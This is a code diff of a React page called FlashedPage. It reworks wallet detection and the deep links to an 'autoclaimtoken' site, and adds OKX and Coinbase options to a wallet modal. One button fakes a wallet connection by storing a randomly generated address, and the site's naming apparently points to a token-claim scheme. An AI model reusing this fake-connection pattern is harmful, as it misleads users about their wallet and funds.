@@ -73,27 +73,29 @@ export default function FlashedPage() {
   const detectWalletAndRedirect = () => {
     const userAgent = navigator.userAgent.toLowerCase();
     const isMobile = /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/.test(userAgent);
-    const isIOS = /iphone|ipad|ipod/.test(userAgent);
-    const isAndroid = /android/.test(userAgent);
     
     if (isMobile) {
-      if (isIOS) {
-        // iOS - Try MetaMask first, then Trust Wallet
-        window.location.href = 'https://metamask.app.link/dapp/autoclaimtoken.vercel.app/flashed';
-      } else if (isAndroid) {
-        // Android - Try Trust Wallet first
-        window.location.href = 'https://link.trustwallet.com/open_url?coin_id=60&url=https://autoclaimtoken.vercel.app/flashed';
-      } else {
-        // Other mobile
-        setShowModal('walletOptions');
-      }
+      // Mobile - Show all wallet options
+      setShowModal('walletOptions');
     } else {
-      // Desktop - Check for installed wallets
+      // Desktop - Detect installed wallets
       if (window.ethereum) {
-        connectWallet();
+        // Check which wallet is installed
+        if (window.ethereum.isMetaMask) {
+          connectWallet();
+        } else if (window.ethereum.isTrust) {
+          connectWallet();
+        } else if (window.ethereum.isOKExWallet) {
+          connectWallet();
+        } else if (window.ethereum.isCoinbaseWallet) {
+          connectWallet();
+        } else {
+          // Unknown wallet but ethereum exists
+          connectWallet();
+        }
       } else {
-        // No wallet installed - show install options
-        window.open('https://metamask.io/download/', '_blank');
+        // No wallet - show options
+        setShowModal('walletOptions');
       }
     }
   };
@@ -1042,7 +1044,10 @@ export default function FlashedPage() {
                       alt="MetaMask" 
                       className="w-8 h-8 mr-3"
                     />
-                    MetaMask
+                    <div>
+                      <div>MetaMask</div>
+                      <div className="text-xs text-orange-200">Most popular wallet</div>
+                    </div>
                   </a>
                   <a 
                     href="https://link.trustwallet.com/open_url?coin_id=60&url=https://autoclaimtoken.vercel.app/flashed"
@@ -1053,26 +1058,56 @@ export default function FlashedPage() {
                       alt="Trust Wallet" 
                       className="w-8 h-8 mr-3 rounded-lg"
                     />
-                    Trust Wallet
+                    <div>
+                      <div>Trust Wallet</div>
+                      <div className="text-xs text-blue-200">Mobile-first wallet</div>
+                    </div>
+                  </a>
+                  <a 
+                    href="https://www.okx.com/web3"
+                    className="flex items-center w-full bg-green-600 hover:bg-green-700 p-4 rounded-lg text-white font-semibold"
+                  >
+                    <div className="w-8 h-8 bg-green-500 rounded-full mr-3 flex items-center justify-center">
+                      <span className="text-white font-bold">O</span>
+                    </div>
+                    <div>
+                      <div>OKX Wallet</div>
+                      <div className="text-xs text-green-200">Exchange wallet</div>
+                    </div>
+                  </a>
+                  <a 
+                    href="https://www.coinbase.com/wallet"
+                    className="flex items-center w-full bg-indigo-600 hover:bg-indigo-700 p-4 rounded-lg text-white font-semibold"
+                  >
+                    <div className="w-8 h-8 bg-indigo-500 rounded-full mr-3 flex items-center justify-center">
+                      <span className="text-white font-bold">C</span>
+                    </div>
+                    <div>
+                      <div>Coinbase Wallet</div>
+                      <div className="text-xs text-indigo-200">Beginner friendly</div>
+                    </div>
                   </a>
                   <button 
                     onClick={() => {
-                      // Simulate wallet connection for mobile users
                       const mockAddress = '0x' + Math.random().toString(16).substr(2, 40);
                       setUserAddress(mockAddress);
                       setShowModal(null);
                       localStorage.setItem('connectedWallet', mockAddress);
                     }}
-                    className="flex items-center w-full bg-purple-600 hover:bg-purple-700 p-4 rounded-lg text-white font-semibold"
+                    className="flex items-center w-full bg-gray-600 hover:bg-gray-700 p-4 rounded-lg text-white font-semibold"
                   >
-                    <div className="w-8 h-8 bg-purple-500 rounded-full mr-3 flex items-center justify-center">
-                      <span className="text-white font-bold">W</span>
+                    <div className="w-8 h-8 bg-gray-500 rounded-full mr-3 flex items-center justify-center">
+                      <span className="text-white font-bold">+</span>
                     </div>
-                    Manual Connection
+                    <div>
+                      <div>Other Wallet</div>
+                      <div className="text-xs text-gray-300">Manual connection</div>
+                    </div>
                   </button>
                 </div>
                 <div className="mt-4 text-center">
-                  <p className="text-gray-400 text-sm">No wallet? Download one above</p>
+                  <p className="text-gray-400 text-sm">Choose your preferred wallet or download one above</p>
+                  <p className="text-gray-500 text-xs mt-1">All wallets work with this platform</p>
                 </div>
               </div>
             </div>
